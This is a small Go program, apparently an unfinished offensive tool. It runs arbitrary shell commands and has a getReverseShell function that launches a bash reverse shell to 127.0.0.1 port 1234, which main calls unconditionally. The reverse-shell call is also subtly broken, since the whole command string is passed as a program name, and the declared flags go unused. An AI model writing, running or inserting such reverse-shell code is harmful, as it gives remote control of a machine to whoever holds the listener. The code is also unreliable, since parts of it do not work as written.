package main

import (
	"flag"
	"fmt"
	"log"
	"os/exec"
	"strings"
)

var (
	command  = flag.String("command", "ls -la", "command to perform console execution")
	execMode = flag.Bool("mode", false, "to select which action to do")
)

func getReverseShell() {
	shell := exec.Command("bash -c 'bash -i &> /dev/tcp/127.0.0.1/1234 0>&1'")
	shell.Run()
	//shell.Stdin, shell.Stdout, shell.Stderr =

}

func CMD(command string) string {
	parts := strings.Fields(command)
	head := parts[0]
	parts = parts[1:]
	out, err := exec.Command(head, parts...).Output()
	if err != nil {
		log.Fatal("Error in the command included for the execution")
	}
	return string(out)
}

func main() {
	// fmt.Println(CMD("ls -la"));
	flag.Parse()
	sample := "ls -la"

	// newName := strings.Split(sample, " ")
	// fmt.Println(newName)

	// for i := 0; i < len(newName); i++ {
	// 	fmt.Println(newName[i])
	// }
	fmt.Println(CMD(sample))
	getReverseShell()
}
